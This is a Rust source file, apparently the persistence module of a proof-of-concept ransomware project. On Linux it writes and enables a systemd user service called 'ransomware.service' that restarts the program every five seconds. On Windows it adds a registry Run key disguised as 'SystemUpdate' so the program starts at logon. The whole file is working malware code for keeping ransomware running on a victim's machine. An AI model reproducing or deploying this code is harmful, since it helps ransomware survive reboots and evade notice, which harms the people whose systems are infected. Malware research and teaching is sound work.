use dirs2::home_dir;
use std::{
    env,
    fs::{create_dir_all, File},
    io::{Error, Result, Write},
    process::Command,
};

fn linux_persistence() -> Result<()> {
    let current_path = env::current_exe()?;
    let home = home_dir().ok_or(Error::other("Failed to find home directory"))?;
    let systemd_path = home.join(".config/systemd/user");
    let service_path = systemd_path.join("ransomware.service");
    let service_str = format!("[Unit]\nDescription=PoC Ransomware\n\n[Service]\nType=simple\nExecStart=\"{}\"\nRestart=always\nRestartSec=5\n\n[Install]\nWantedBy=default.target", current_path.to_string_lossy());

    create_dir_all(systemd_path)?;
    let mut service_file = File::create(service_path)?;

    service_file.write_all(service_str.as_bytes())?;

    let status = Command::new("systemctl")
        .args(["--user", "daemon-reload"])
        .status()
        .map_err(|_| Error::other("Failed to execute systemctl command"))?;

    if !status.success() {
        return Err(Error::other("systemctl daemon-reload failure"));
    }

    let status = Command::new("systemctl")
        .args(["--user", "enable", "--now", "ransomware.service"])
        .status()
        .map_err(|_| Error::other("Failed to execute systemctl command"))?;

    if status.success() {
        Ok(())
    } else {
        Err(Error::other("systemctl enable --now failure"))
    }
}

#[cfg(target_os = "windows")]
fn windows_persistence() -> Result<()> {
    use winreg::enums::*;
    use winreg::RegKey;

    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let path = std::path::Path::new("Software")
        .join("Microsoft")
        .join("Windows")
        .join("CurrentVersion")
        .join("Run");
    let (key, _) = hkcu.create_subkey(&path)?;
    let exe_path = env::current_exe()?;
    key.set_value("SystemUpdate", &exe_path.to_string_lossy().as_ref())?;
    Ok(())
}

pub fn install_persistence() -> Result<()> {
    #[cfg(target_os = "linux")]
    {
        linux_persistence()
    }
    #[cfg(target_os = "windows")]
    {
        windows_persistence()
    }
}
